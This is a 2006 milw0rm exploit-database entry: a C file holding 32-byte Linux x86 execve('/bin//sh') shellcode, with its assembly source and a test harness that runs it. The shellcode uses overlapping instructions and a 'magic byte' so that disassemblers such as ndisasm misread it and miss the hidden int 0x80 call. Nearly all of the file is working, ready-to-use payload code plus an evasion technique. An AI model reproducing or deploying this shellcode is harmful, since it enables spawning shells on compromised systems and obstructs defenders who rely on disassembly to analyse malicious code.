/*  execve() shellcode with 'fuck up disasm' ability, 32 bytes long
    by BaCkSpAcE [sinisa86(at)gmail(dot)com]
    BitByterz Labs 2006
    http://www.bitbyterz.org

;
; shellcode.asm
;
  fupdisasm:
    db 0x68		; opcode for PUSH DW instruction
    db 0xcd		; crypt+1, opcode for INT instruction
    db 0x80		; interrupt number (80 in this case)
    db 0x68		; crypt+3
    db 0x68
    jmp fupdisasm+3
    db 0x68		; MAGIC_BYTE: this byte makes disasm go crazy

; our shellcode which we want to hide
    push byte 11
    pop eax
    xor edx, edx
    push edx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push edx
    push ebx
    mov ecx, esp
    jmp fupdisasm+1	; jumps on address where is hidden int 0x80


    backspace@bitbyterz# nasm shellcode.asm
    backspace@bitbyterz# ndisasm -u shellcode
    00000000  68CD806868        push dword 0x686880cd
    00000005  EBFC              jmp short 0x3
    00000007  686A0B5831        push dword 0x31580b6a
    0000000C  D25268            rcl byte [edx+0x68],cl
    0000000F  2F                das
    00000010  2F                das
    00000011  7368              jnc 0x7b
    00000013  682F62696E        push dword 0x6e69622f
    00000018  89E3              mov ebx,esp
    0000001A  52                push edx
    0000001B  53                push ebx
    0000001C  89E1              mov ecx,esp
    0000001E  EBE1              jmp short 0x1

    Find difference between original and dissasembled shellcode ;)
*/

#include <stdio.h>
#include <string.h>

char shellcode[] =      "\x68\xcd\x80\x68\x68\xeb\xfc\x68"
			"\x6a\x0b\x58\x31\xd2\x52\x68\x2f"
			"\x2f\x73\x68\x68\x2f\x62\x69\x6e"
			"\x89\xe3\x52\x53\x89\xe1\xeb\xe1";

main() {
  void  (*fp) (void);
  fp = (void *) shellcode;
  printf ("%d bytes\n", strlen(shellcode));
  fp();
}

// milw0rm.com [2006-05-14]